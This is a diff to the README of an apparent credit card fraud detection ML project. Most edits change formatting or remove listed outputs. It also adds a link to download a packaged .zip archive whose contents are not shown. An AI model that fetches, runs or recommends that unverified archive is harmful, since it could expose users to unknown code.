@@ -108,20 +108,21 @@ Windows:
 
 venv\Scripts\activate
 
-2️⃣ Install dependencies
-pip install -r requirements.txt
+2️⃣ Install dependencies 
 
+pip install -r requirements.txt
 
 
 🚀 Running the Training Pipeline
   
 ▶ Final Model Training Command (Recommended)
+
 python credit_fraud_train.py --model RandomForest --scaler StandardScaler --train 'data/newtrain.csv' --val 'data/val.csv'
 
 ▶ Try other configurations
 
 The pipeline is fully configurable.
-
+<pre>
 ⚙️ Command-Line Arguments
 Argument	Description
 --model	LogisticRegression / RandomForest / NeuralNetwork / VotingClassifier
@@ -133,9 +134,11 @@ Argument	Description
 --factor	Sampling factor for SMOTE
 --outliers_features	List of feature names for outlier removal
 --outliers_factor	Controls aggressiveness of outlier deletion
+  </pre>
 ## 📊 Evaluation Metrics
 
 Due to extreme imbalance, accuracy is useless.
+
 Instead, the project uses metrics designed for rare-event classification:
 
 F1-Score
@@ -206,20 +209,16 @@ Trained model (.pkl)
 
 Scaler (.pkl)
 
-Metrics JSON
-
-Predictions CSV
-
-Best threshold & configs
+Best threshold
 
 Download the full packaged output:
+
 🔗 https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip
 
 🧩 Future Improvements
 
 Deploy a FastAPI realtime inference service
 
-Add threshold optimization for maximizing recall
 
 Experiment with LightGBM / XGBoost
 
